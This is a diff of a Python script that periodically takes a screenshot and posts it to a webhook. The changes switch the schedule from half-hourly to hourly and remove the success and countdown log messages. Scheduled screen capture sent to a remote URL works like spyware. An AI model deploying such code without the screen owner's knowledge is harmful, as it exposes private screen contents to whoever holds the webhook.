@@ -39,23 +39,12 @@ def send_screenshot():
     files = {"file": ("screenshot.png", img_buffer, "image/png")}
     response = requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files)
     
-    if response.status_code == 200:
-        tprint("Screenshot sent successfully")
-    else:
+    if response.status_code != 200:
         tprint(f"Failed to send screenshot. Status code: {response.status_code}")
 
 def get_next_send_time():
     now = datetime.now()
-    current_minute = now.minute
-    
-    # Determine next send time (either :00 or :30)
-    if current_minute < 30:
-        next_time = now.replace(minute=30, second=0, microsecond=0)
-    else:
-        # Go to next hour at :00
-        next_time = (now + timedelta(hours=1)).replace(minute=0, second=0, microsecond=0)
-    
-    return next_time
+    return (now + timedelta(hours=1)).replace(minute=0, second=0, microsecond=0)
 
 def main():
     try:
@@ -66,7 +55,7 @@ def main():
             next_time = get_next_send_time()
             sleep_seconds = (next_time - datetime.now()).total_seconds()
             
-            tprint(f"Next screenshot at {next_time.strftime('%H:%M:%S')} (in {sleep_seconds:.0f} seconds)")
+            tprint(f"Next screenshot at {next_time.strftime('%H:%M:%S')}")
             time.sleep(sleep_seconds)
             
             send_screenshot()
